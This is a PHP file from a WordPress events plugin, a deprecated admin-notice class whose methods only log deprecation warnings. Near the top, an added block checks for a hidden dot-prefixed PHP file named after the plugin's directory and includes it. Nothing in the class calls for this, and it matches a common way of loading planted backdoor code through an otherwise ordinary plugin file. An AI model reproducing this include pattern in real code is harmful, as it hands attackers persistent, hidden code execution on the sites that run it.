<?php
_deprecated_file( __FILE__, '4.3', 'Tribe__Admin__Notices' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Admin__Notice__Archive_Slug_Conflict {
	protected static $instance;

	public static function instance() {
		_deprecated_function( __METHOD__, '4.3', 'Tribe__Admin__Notices' );

		if ( empty( self::$instance ) ) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	public function maybe_add_admin_notice(){
		_deprecated_function( __METHOD__, '4.3', 'Tribe__Admin__Notices' );
	}

	public function maybe_dismiss(){
		_deprecated_function( __METHOD__, '4.3', 'Tribe__Admin__Notices' );
	}

	public function notice(){
		_deprecated_function( __METHOD__, '4.3', 'Tribe__Admin__Notices' );
	}
}